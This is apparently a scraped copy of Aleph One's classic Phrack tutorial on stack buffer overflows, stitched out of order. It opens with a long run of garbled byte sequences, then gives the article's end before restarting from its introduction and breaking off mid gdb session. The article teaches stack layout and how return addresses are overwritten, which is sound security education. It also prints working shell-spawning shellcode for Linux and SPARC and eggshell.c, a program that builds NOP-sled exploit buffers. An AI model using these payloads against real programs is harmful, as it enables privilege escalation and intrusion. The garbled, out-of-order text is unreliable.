\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4 \u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0 \u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf \u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff \u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4 \u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf \u00b0\u00a4\u00ff\u00bf\u00b0\u00a4\u00ff\u00bf\u00b0\u00a4 Warning: some arguments in previous message were lost $ ------------------------------------------------------------------------------ On the first try! It has certainly increased our odds. Depending how much environment data the exploit program has compared with the program you are trying to exploit the guessed address may be to low or to high. Experiment both with positive and negative offsets. Finding Buffer Overflows ~~~~~~~~~~~~~~~~~~~~~~~~ As stated earlier, buffer overflows are the result of stuffing more information into a buffer than it is meant to hold. Since C does not have any built-in bounds checking, overflows often manifest themselves as writing past the end of a character array. The standard C library provides a number of functions for copying or appending strings, that perform no boundary checking. They include: strcat(), strcpy(), sprintf(), and vsprintf(). These functions operate on null-terminated strings, and do not check for overflow of the receiving string. gets() is a function that reads a line from stdin into a buffer until either a terminating newline or EOF. It performs no checks for buffer overflows. The scanf() family of functions can also be a problem if you are matching a sequence of non-white-space characters (%s), or matching a non-empty sequence of characters from a specified set (%[]), and the array pointed to by the char pointer, is not large enough to accept the whole sequence of characters, and you have not defined the optional maximum field width. If the target of any of these functions is a buffer of static size, and its other argument was somehow derived from user input there is a good posibility that you might be able to exploit a buffer overflow. Another usual programming construct we find is the use of a while loop to read one character at a time into a buffer from stdin or some file until the end of line, end of file, or some other delimiter is reached. This type of construct usually uses one of these functions: getc(), fgetc(), or getchar(). If there is no explicit checks for overflows in the while loop, such programs are easily exploited. To conclude, grep(1) is your friend. The sources for free operating systems and their utilities is readily available. This fact becomes quite interesting once you realize that many comercial operating systems utilities where derived from the same sources as the free ones. Use the source d00d. Appendix A - Shellcode for Different Operating Systems/Architectures ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ i386/Linux ------------------------------------------------------------------------------ jmp 0x1f popl %esi movl %esi,0x8(%esi) xorl %eax,%eax movb %eax,0x7(%esi) movl %eax,0xc(%esi) movb $0xb,%al movl %esi,%ebx leal 0x8(%esi),%ecx leal 0xc(%esi),%edx int $0x80 xorl %ebx,%ebx movl %ebx,%eax inc %eax int $0x80 call -0x24 .string \\\"/bin/sh\\\" ------------------------------------------------------------------------------ SPARC/Solaris ------------------------------------------------------------------------------ sethi 0xbd89a, %l6 or %l6, 0x16e, %l6 sethi 0xbdcda, %l7 and %sp, %sp, %o0 add %sp, 8, %o1 xor %o2, %o2, %o2 add %sp, 16, %sp std %l6, [%sp - 16] st %sp, [%sp - 8] st %g0, [%sp - 4] mov 0x3b, %g1 ta 8 xor %o7, %o7, %o0 mov 1, %g1 ta 8 ------------------------------------------------------------------------------ SPARC/SunOS ------------------------------------------------------------------------------ sethi 0xbd89a, %l6 or %l6, 0x16e, %l6 sethi 0xbdcda, %l7 and %sp, %sp, %o0 add %sp, 8, %o1 xor %o2, %o2, %o2 add %sp, 16, %sp std %l6, [%sp - 16] st %sp, [%sp - 8] st %g0, [%sp - 4] mov 0x3b, %g1 mov -0x1, %l5 ta %l5 + 1 xor %o7, %o7, %o0 mov 1, %g1 ta %l5 + 1 ------------------------------------------------------------------------------ Appendix B - Generic Buffer Overflow Program ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shellcode.h ------------------------------------------------------------------------------ #if defined(__i386__) && defined(__linux__) #define NOP_SIZE 1 char nop[] = \"\\x90\"; char shellcode[] = \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; unsigned long get_sp(void) { __asm__(\"movl %esp,%eax\"); } #elif defined(__sparc__) && defined(__sun__) && defined(__svr4__) #define NOP_SIZE 4 char nop[]=\"\\xac\\x15\\xa1\\x6e\"; char shellcode[] = \"\\x2d\\x0b\\xd8\\x9a\\xac\\x15\\xa1\\x6e\\x2f\\x0b\\xdc\\xda\\x90\\x0b\\x80\\x0e\" \"\\x92\\x03\\xa0\\x08\\x94\\x1a\\x80\\x0a\\x9c\\x03\\xa0\\x10\\xec\\x3b\\xbf\\xf0\" \"\\xdc\\x23\\xbf\\xf8\\xc0\\x23\\xbf\\xfc\\x82\\x10\\x20\\x3b\\x91\\xd0\\x20\\x08\" \"\\x90\\x1b\\xc0\\x0f\\x82\\x10\\x20\\x01\\x91\\xd0\\x20\\x08\"; unsigned long get_sp(void) { __asm__(\"or %sp, %sp, %i0\"); } #elif defined(__sparc__) && defined(__sun__) #define NOP_SIZE 4 char nop[]=\"\\xac\\x15\\xa1\\x6e\"; char shellcode[] = \"\\x2d\\x0b\\xd8\\x9a\\xac\\x15\\xa1\\x6e\\x2f\\x0b\\xdc\\xda\\x90\\x0b\\x80\\x0e\" \"\\x92\\x03\\xa0\\x08\\x94\\x1a\\x80\\x0a\\x9c\\x03\\xa0\\x10\\xec\\x3b\\xbf\\xf0\" \"\\xdc\\x23\\xbf\\xf8\\xc0\\x23\\xbf\\xfc\\x82\\x10\\x20\\x3b\\xaa\\x10\\x3f\\xff\" \"\\x91\\xd5\\x60\\x01\\x90\\x1b\\xc0\\x0f\\x82\\x10\\x20\\x01\\x91\\xd5\\x60\\x01\"; unsigned long get_sp(void) { __asm__(\"or %sp, %sp, %i0\"); } #endif ------------------------------------------------------------------------------ eggshell.c ------------------------------------------------------------------------------ /* * eggshell v1.0 * * Aleph One / aleph1@underground.org */ #include <stdlib.h> #include <stdio.h> #include \"shellcode.h\" #define DEFAULT_OFFSET 0 #define DEFAULT_BUFFER_SIZE 512 #define DEFAULT_EGG_SIZE 2048 void usage(void); void main(int argc, char *argv[]) { char *ptr, *bof, *egg; long *addr_ptr, addr; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE; while ((c = getopt(argc, argv, \"a:b:e:o:\")) != EOF) switch (c) { case 'a': align = atoi(optarg); break; case 'b': bsize = atoi(optarg); break; case 'e': eggsize = atoi(optarg); break; case 'o': offset = atoi(optarg); break; case '?': usage(); exit(0); } if (strlen(shellcode) > eggsize) { printf(\"Shellcode is larger the the egg.\\n\"); exit(0); } if (!(bof = malloc(bsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } if (!(egg = malloc(eggsize))) { printf(\"Can't allocate memory.\\n\"); exit(0); } addr = get_sp() - offset; printf(\"[ Buffer size:\\t%d\\t\\tEgg size:\\t%d\\tAligment:\\t%d\\t]\\n\", bsize, eggsize, align); printf(\"[ Address:\\t0x%x\\tOffset:\\t\\t%d\\t\\t\\t\\t]\\n\", addr, offset); addr_ptr = (long *) bof; for (i = 0; i < bsize; i+=4) *(addr_ptr++) = addr; ptr = egg; for (i = 0; i <= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE) for (n = 0; n < NOP_SIZE; n++) { m = (n + align) % NOP_SIZE; *(ptr++) = nop[m]; } for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i]; bof[bsize - 1] = '\\0'; egg[eggsize - 1] = '\\0'; memcpy(egg,\"EGG=\",4); putenv(egg); memcpy(bof,\"BOF=\",4); putenv(bof); system(\"/bin/sh\"); } void usage(void) { (void)fprintf(stderr, \"usage: eggshell [-a <alignment>] [-b <buffersize>] [-e <eggsize>] [-o <offset>]\\n\"); } ------------------------------------------------------------------------------ \u539f\u6587\u94fe\u63a5\uff1a https://insecure.org/stf/smashstack.html","title":"Smashing the Stack for Fun and Profit by Aleph One"},{"location":"other/Smashing%20the%20Stack%20for%20Fun%20and%20Profit%20by%20Aleph%20One/#smashing-the-stack-for-fun-and-profit-by-aleph-one","text":".oO Phrack 49 Oo. Volume Seven, Issue Forty-Nine File 14 of 16 BugTraq, r00t, and Underground.Org bring you XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX Smashing The Stack For Fun And Profit XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX by Aleph One aleph1@underground.org `smash the stack` [C programming] n. On many C implementations it is possible to corrupt the execution stack by writing past the end of an array declared auto in a routine. Code that does this is said to smash the stack, and can cause return from the routine to jump to a random address. This can produce some of the most insidious data-dependent bugs known to mankind. Variants include trash the stack, scribble the stack, mangle the stack; the term mung the stack is not used, as this is never done intentionally. See spam; see also alias bug, fandango on core, memory leak, precedence lossage, overrun screw. Introduction ~~~~~~~~~~~~ Over the last few months there has been a large increase of buffer overflow vulnerabilities being both discovered and exploited. Examples of these are syslog, splitvt, sendmail 8.7.5, Linux/FreeBSD mount, Xt library, at, etc. This paper attempts to explain what buffer overflows are, and how their exploits work. Basic knowledge of assembly is required. An understanding of virtual memory concepts, and experience with gdb are very helpful but not necessary. We also assume we are working with an Intel x86 CPU, and that the operating system is Linux. Some basic definitions before we begin: A buffer is simply a contiguous block of computer memory that holds multiple instances of the same data type. C programmers normally associate with the word buffer arrays. Most commonly, character arrays. Arrays, like all variables in C, can be declared either static or dynamic. Static variables are allocated at load time on the data segment. Dynamic variables are allocated at run time on the stack. To overflow is to flow, or fill over the top, brims, or bounds. We will concern ourselves only with the overflow of dynamic buffers, otherwise known as stack-based buffer overflows. Process Memory Organization ~~~~~~~~~~~~~~~~~~~~~~~~~~~ To understand what stack buffers are we must first understand how a process is organized in memory. Processes are divided into three regions: Text, Data, and Stack. We will concentrate on the stack region, but first a small overview of the other regions is in order. The text region is fixed by the program and includes code (instructions) and read-only data. This region corresponds to the text section of the executable file. This region is normally marked read-only and any attempt to write to it will result in a segmentation violation. The data region contains initialized and uninitialized data. Static variables are stored in this region. The data region corresponds to the data-bss sections of the executable file. Its size can be changed with the brk(2) system call. If the expansion of the bss data or the user stack exhausts available memory, the process is blocked and is rescheduled to run again with a larger memory space. New memory is added between the data and stack segments. /------------------\\ lower | | memory | Text | addresses | | |------------------| | (Initialized) | | Data | | (Uninitialized) | |------------------| | | | Stack | higher | | memory \\------------------/ addresses Fig. 1 Process Memory Regions What Is A Stack? ~~~~~~~~~~~~~~~~ A stack is an abstract data type frequently used in computer science. A stack of objects has the property that the last object placed on the stack will be the first object removed. This property is commonly referred to as last in, first out queue, or a LIFO. Several operations are defined on stacks. Two of the most important are PUSH and POP. PUSH adds an element at the top of the stack. POP, in contrast, reduces the stack size by one by removing the last element at the top of the stack. Why Do We Use A Stack? ~~~~~~~~~~~~~~~~~~~~~~ Modern computers are designed with the need of high-level languages in mind. The most important technique for structuring programs introduced by high-level languages is the procedure or function. From one point of view, a procedure call alters the flow of control just as a jump does, but unlike a jump, when finished performing its task, a function returns control to the statement or instruction following the call. This high-level abstraction is implemented with the help of the stack. The stack is also used to dynamically allocate the local variables used in functions, to pass parameters to the functions, and to return values from the function. The Stack Region ~~~~~~~~~~~~~~~~ A stack is a contiguous block of memory containing data. A register called the stack pointer (SP) points to the top of the stack. The bottom of the stack is at a fixed address. Its size is dynamically adjusted by the kernel at run time. The CPU implements instructions to PUSH onto and POP off of the stack. The stack consists of logical stack frames that are pushed when calling a function and popped when returning. A stack frame contains the parameters to a function, its local variables, and the data necessary to recover the previous stack frame, including the value of the instruction pointer at the time of the function call. Depending on the implementation the stack will either grow down (towards lower memory addresses), or up. In our examples we'll use a stack that grows down. This is the way the stack grows on many computers including the Intel, Motorola, SPARC and MIPS processors. The stack pointer (SP) is also implementation dependent. It may point to the last address on the stack, or to the next free available address after the stack. For our discussion we'll assume it points to the last address on the stack. In addition to the stack pointer, which points to the top of the stack (lowest numerical address), it is often convenient to have a frame pointer (FP) which points to a fixed location within a frame. Some texts also refer to it as a local base pointer (LB). In principle, local variables could be referenced by giving their offsets from SP. However, as words are pushed onto the stack and popped from the stack, these offsets change. Although in some cases the compiler can keep track of the number of words on the stack and thus correct the offsets, in some cases it cannot, and in all cases considerable administration is required. Futhermore, on some machines, such as Intel-based processors, accessing a variable at a known distance from SP requires multiple instructions. Consequently, many compilers use a second register, FP, for referencing both local variables and parameters because their distances from FP do not change with PUSHes and POPs. On Intel CPUs, BP (EBP) is used for this purpose. On the Motorola CPUs, any address register except A7 (the stack pointer) will do. Because the way our stack grows, actual parameters have positive offsets and local variables have negative offsets from FP. The first thing a procedure must do when called is save the previous FP (so it can be restored at procedure exit). Then it copies SP into FP to create the new FP, and advances SP to reserve space for the local variables. This code is called the procedure prolog. Upon procedure exit, the stack must be cleaned up again, something called the procedure epilog. The Intel ENTER and LEAVE instructions and the Motorola LINK and UNLINK instructions, have been provided to do most of the procedure prolog and epilog work efficiently. Let us see what the stack looks like in a simple example: example1.c: ------------------------------------------------------------------------------ void function(int a, int b, int c) { char buffer1[5]; char buffer2[10]; } void main() { function(1,2,3); } ------------------------------------------------------------------------------ To understand what the program does to call function() we compile it with gcc using the -S switch to generate assembly code output: $ gcc -S -o example1.s example1.c By looking at the assembly language output we see that the call to function() is translated to: pushl $3 pushl $2 pushl $1 call function This pushes the 3 arguments to function backwards into the stack, and calls function(). The instruction 'call' will push the instruction pointer (IP) onto the stack. We'll call the saved IP the return address (RET). The first thing done in function is the procedure prolog: pushl %ebp movl %esp,%ebp subl $20,%esp This pushes EBP, the frame pointer, onto the stack. It then copies the current SP onto EBP, making it the new FP pointer. We'll call the saved FP pointer SFP. It then allocates space for the local variables by subtracting their size from SP. We must remember that memory can only be addressed in multiples of the word size. A word in our case is 4 bytes, or 32 bits. So our 5 byte buffer is really going to take 8 bytes (2 words) of memory, and our 10 byte buffer is going to take 12 bytes (3 words) of memory. That is why SP is being subtracted by 20. With that in mind our stack looks like this when function() is called (each space represents a byte): bottom of top of memory memory buffer2 buffer1 sfp ret a b c <------ [ ][ ][ ][ ][ ][ ][ ] top of bottom of stack stack Buffer Overflows ~~~~~~~~~~~~~~~~ A buffer overflow is the result of stuffing more data into a buffer than it can handle. How can this often found programming error can be taken advantage to execute arbitrary code? Lets look at another example: example2.c ------------------------------------------------------------------------------ void function(char *str) { char buffer[16]; strcpy(buffer,str); } void main() { char large_string[256]; int i; for( i = 0; i < 255; i++) large_string[i] = 'A'; function(large_string); } ------------------------------------------------------------------------------ This is program has a function with a typical buffer overflow coding error. The function copies a supplied string without bounds checking by using strcpy() instead of strncpy(). If you run this program you will get a segmentation violation. Lets see what its stack looks when we call function: bottom of top of memory memory buffer sfp ret *str <------ [ ][ ][ ][ ] top of bottom of stack stack What is going on here? Why do we get a segmentation violation? Simple. strcpy() is coping the contents of *str (larger_string[]) into buffer[] until a null character is found on the string. As we can see buffer[] is much smaller than *str. buffer[] is 16 bytes long, and we are trying to stuff it with 256 bytes. This means that all 250 bytes after buffer in the stack are being overwritten. This includes the SFP, RET, and even *str! We had filled large_string with the character 'A'. It's hex character value is 0x41. That means that the return address is now 0x41414141. This is outside of the process address space. That is why when the function returns and tries to read the next instruction from that address you get a segmentation violation. So a buffer overflow allows us to change the return address of a function. In this way we can change the flow of execution of the program. Lets go back to our first example and recall what the stack looked like: bottom of top of memory memory buffer2 buffer1 sfp ret a b c <------ [ ][ ][ ][ ][ ][ ][ ] top of bottom of stack stack Lets try to modify our first example so that it overwrites the return address, and demonstrate how we can make it execute arbitrary code. Just before buffer1[] on the stack is SFP, and before it, the return address. That is 4 bytes pass the end of buffer1[]. But remember that buffer1[] is really 2 word so its 8 bytes long. So the return address is 12 bytes from the start of buffer1[]. We'll modify the return value in such a way that the assignment statement 'x = 1;' after the function call will be jumped. To do so we add 8 bytes to the return address. Our code is now: example3.c: ------------------------------------------------------------------------------ void function(int a, int b, int c) { char buffer1[5]; char buffer2[10]; int *ret; ret = buffer1 + 12; (*ret) += 8; } void main() { int x; x = 0; function(1,2,3); x = 1; printf(\"%d\\n\",x); } ------------------------------------------------------------------------------ What we have done is add 12 to buffer1[]'s address. This new address is where the return address is stored. We want to skip pass the assignment to the printf call. How did we know to add 8 to the return address? We used a test value first (for example 1), compiled the program, and then started gdb: ------------------------------------------------------------------------------ [aleph1]$ gdb example3 GDB is free software and you are welcome to distribute copies 